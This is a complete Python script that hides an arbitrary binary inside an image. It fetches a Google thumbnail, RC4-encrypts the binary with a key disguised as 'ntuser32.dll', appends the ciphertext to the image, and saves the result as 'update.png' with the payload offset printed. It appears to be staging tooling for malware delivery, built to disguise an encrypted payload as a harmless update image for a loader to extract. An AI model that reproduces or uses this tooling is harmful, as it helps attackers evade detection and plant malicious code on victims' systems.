#!/usr/bin/env python3

import sys
import requests
from Crypto.Cipher import ARC4

IMG_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRhKmNr2YirY0nDF8u1eYoVwbe7V-1pk6dLVg&s"
OUTPUT_PATH = "update.png"
KEY = b"ntuser32.dll"

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <binary>")
    sys.exit(1)

img_data = requests.get(IMG_URL).content

with open(sys.argv[1], "rb") as f:
    bin_data = f.read()
    cipher = ARC4.new(KEY)
    bin_enc = cipher.encrypt(bin_data)

with open(OUTPUT_PATH, "wb") as out:
    out.write(img_data)
    offset = len(img_data)
    out.write(bin_enc)

print(f"Output: {OUTPUT_PATH}")
print(f"Binary data offset: 0x{offset:06x}")
